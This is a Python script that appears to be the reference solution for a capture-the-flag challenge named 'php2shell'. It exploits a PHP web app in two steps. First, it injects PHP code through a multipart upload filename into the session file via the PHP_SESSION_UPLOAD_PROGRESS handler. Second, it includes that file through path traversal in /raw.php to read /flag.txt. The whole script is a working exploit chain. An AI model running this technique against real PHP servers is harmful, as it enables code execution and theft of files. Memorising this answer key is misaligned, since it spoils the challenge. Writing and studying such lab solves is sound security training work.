#!/usr/bin/env python3
"""Reference solve for php2shell.

Chain:
  1. POST a multipart body to / with a file whose `filename` is PHP source.
     The PHP upload_progress handler writes the filename (unsanitized) into
     the session file at /tmp/sess_<SID>.
  2. The `/raw.php` endpoint does @include($file) on a user-controlled path.
     We traverse to the session file; PHP parses the file, including the
     <?=...?> part we injected; the rest is emitted as HTML text.
  3. Extract the flag from the response.

Prints TOKEN:<flag>.
"""
import urllib.request
import re
import uuid
import sys

sid = uuid.uuid4().hex
payload = "Z<?=file_get_contents('/flag.txt')?>"
boundary = '-----bnd'

parts = [
    b'--' + boundary.encode() + b'\r\n',
    b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n1\r\n',
    b'--' + boundary.encode() + b'\r\n',
    ('Content-Disposition: form-data; name="f"; filename="' + payload + '"\r\n').encode(),
    b'Content-Type: application/octet-stream\r\n\r\n',
    b'AAAA' * 5000,
    b'\r\n--' + boundary.encode() + b'--\r\n',
]
body = b''.join(parts)

req = urllib.request.Request(
    'http://app/',
    data=body,
    headers={
        'Cookie': 'PHPSESSID=' + sid,
        'Content-Type': 'multipart/form-data; boundary=' + boundary,
    },
    method='POST',
)

with urllib.request.urlopen(req, timeout=5) as f:
    f.read()

with urllib.request.urlopen('http://app/raw.php?page=../../../../../tmp/sess_' + sid, timeout=5) as f:
    out = f.read().decode()

m = re.search(r'FLAG\{[0-9a-f]{32}\}', out)
print(out)
print('TOKEN:', m.group(0) if m else 'NONE')
sys.exit(0 if m else 1)
